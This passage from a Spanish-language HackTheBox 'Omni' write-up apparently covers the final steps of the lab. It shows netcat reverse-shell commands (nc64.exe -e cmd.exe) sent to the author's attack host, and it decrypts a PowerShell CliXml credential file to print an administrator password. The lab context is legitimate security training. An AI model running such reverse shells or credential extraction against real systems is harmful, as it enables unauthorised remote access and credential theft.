+<p>El tema es que el algoritmo está apoyado en una <a href="https://social.msdn.microsoft.com/Forums/sqlserver/en-US/cfd1cfd8-cbeb-42eb-b8bd-68f4d8b451f1/convertfromsecurestring-throws-a-cryptographicexception-in-windows-iot?forum=WindowsIoT">llave</a> única de cada usuario y pues al ser nosotros <strong>administrator</strong>, no tenemos la llave de <strong>app</strong>, que sería el usuario que puede manejar <code>user.txt</code>, puedes <a href="https://www.travisgan.com/2015/06/powershell-password-encryption.html">encontrar más info acá</a> y <a href="https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/">acá</a>.</p>
+
+<p>Entonces probemos con <code>root.txt</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs2flagroot.png" alt="rvs2flagroot" /></p>
+
+<p>Perfecccccccto, tenemos el hash MD5 que piden en HTB, solo nos queda pasarnos al usuario <strong>app</strong> y ver la flag <code>user.txt</code>. (Tengo la impresión que hice el proceso al revés, con lo que sigue lo confirmo o me retracto :P)</p>
+
+<p>Hacemos el mismo procedimiento que con el usuario <strong>administrator</strong>. Entramos al portal y mediante la ejecución de comandos le decimos que nos haga una reverse Shell como <strong>app</strong>…</p>
+
+<blockquote>
+  <p>Realmente no creo que sean necesarias las reverse shell, ya que podemos ejecutar la linea desde el mismo portal, pero yo que se, me gusta :)</p>
+</blockquote>
+
+<pre><code class="language-powershell">Command&gt; echo %userprofile%
+Command&gt; c:\Data\Users\DefaultAccount\nc64.exe 10.10.14.188 4435 -e cmd.exe
+Access is denied.
+</code></pre>
+
+<p>Muy bien, entonces movamos el binario a una carpeta de la que sea propietario el usuario <strong>app</strong>. Lo hice con la sesión que tenía abierta de <strong>SYSTEM</strong>, cerré la de <strong>administrator</strong> :(</p>
+
+<p>Lo movemos a <code>c:\Data\Users\app\Videos</code> y despues en el portal:</p>
+
+<pre><code class="language-powershell">c:\Data\Users\app\Videos\nc64.exe 10.10.14.188 4435 -e cmd.exe
+</code></pre>
+
+<p>Veamos la flag de <code>user.txt</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs3flaguser.png" alt="rvs3flaguser" /></p>
+
+<p>Bien, ahora quiero probar si hice todo al revés o si daba igual &lt;&gt;_&lt;&gt;</p>
+
+<pre><code class="language-powershell">PS C:\Data\Users\app&gt; $credential = Import-CliXml -Path c:\Data\Users\app\iot-admin.xml
+PS C:\Data\Users\app&gt; $credential.GetNetworkCredential().Username
+administrator
+PS C:\Data\Users\app&gt; $credential.GetNetworkCredential().Password
+_1nt3rn37ofTh1nGz
+PS C:\Data\Users\app&gt; 
+</code></pre>
+
+<p>Entiendo que daba igual, ya que con esta contraseña entrabamos al portal, pero como el usuario administrador… Algo raro es que en el archivo <code>r.bat</code> no sé por qué no estaban solo las credenciales del usuario <strong>app</strong>, para que <code>iot-admin.xml</code> tomara valor… Muy extraño.</p>
+
+<p>…</p>
+
+<p>Pero listos, hemos terminado con esta máquina, la verdad, sencilla. Un poco desesperante el encontrar el archivo <code>r.bat</code>, pero bueno, de eso se trata la enumeración. Hicimos el camino al revés, pero llegamos al mismo sitio, así que todo perfecto. Muchas gracias por leer y a seguir rompiendo todo (:</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Omni&url=http://localhost:4000/htb/omni" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#IoT">IoT</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#powershell">powershell</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
